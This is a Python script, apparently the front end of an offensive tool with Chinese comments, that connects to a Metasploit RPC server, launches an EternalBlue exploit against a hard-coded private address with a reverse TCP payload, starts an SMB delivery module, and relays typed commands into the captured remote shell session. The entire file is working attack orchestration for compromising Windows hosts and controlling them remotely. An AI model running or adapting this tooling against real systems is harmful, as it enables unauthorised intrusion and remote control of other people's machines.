import asyncio
import sys
import threading
from typing import Callable

import pymetasploit3.msfrpc
from pymetasploit3.msfrpc import MsfRpcClient

from libs.GUI import GUI
from libs.Logger import Logger
from libs.Payloads import Payloads
from libs.modules.Eternalblue import Eternalblue
from libs.modules.SMB_Delivery import SMB_Delivery

client: MsfRpcClient
logger = Logger('Main')
gui = GUI('My Console')
stop_funcs: list[Callable] = []


@gui.event
def on_input_line(gui, text):
    # TODO: 多分頁區分 session
    # 若無 client 定義、連線
    if not client:
        gui.println('請等待 RPC 連線成功再輸入指令')
        return

    # 若無 Session
    if len(client.sessions.list) == 0:
        gui.println('目前無可用的 session 連線')
        return

    # 顯示輸入內容
    gui.println(f'$ {text}')

    # 傳送指令
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    shell.write(text)


async def connect_rpc():
    try:
        logger.info('正在連線到 RPC...')
        global client
        client = MsfRpcClient("salt", port=55553, ssl=True)
        logger.succ('成功連線到 RPC')
    except pymetasploit3.msfrpc.MsfAuthError:
        logger.err('驗證失敗，無法連線到 RPC')
        sys.exit(1)


async def attack():
    """
    異步攻擊線程
    """

    # 建立客戶端
    await connect_rpc()

    # 初始化攻擊
    eternal_blue = Eternalblue(client, '172.20.10.2', Payloads.REVERSE_TCP)
    smb_delivery = SMB_Delivery(client, SRVPORT=4445)

    stop_funcs.append(eternal_blue.stop)
    stop_funcs.append(smb_delivery.stop)

    @eternal_blue.event
    async def on_read(text):
        gui.println(text)

    @smb_delivery.event
    async def on_read(text):
        gui.println(text)

    await asyncio.gather(
        eternal_blue.run(),
        smb_delivery.run(),
    )


async def main():
    attack_thread = threading.Thread(target=lambda: asyncio.run(attack()))
    attack_thread.start()

    await gui.build()

    logger.info('正在關閉...')
    for func in stop_funcs:
        func()
    client.logout()

    logger.succ('關閉完成')


if __name__ == "__main__":
    asyncio.run(main())
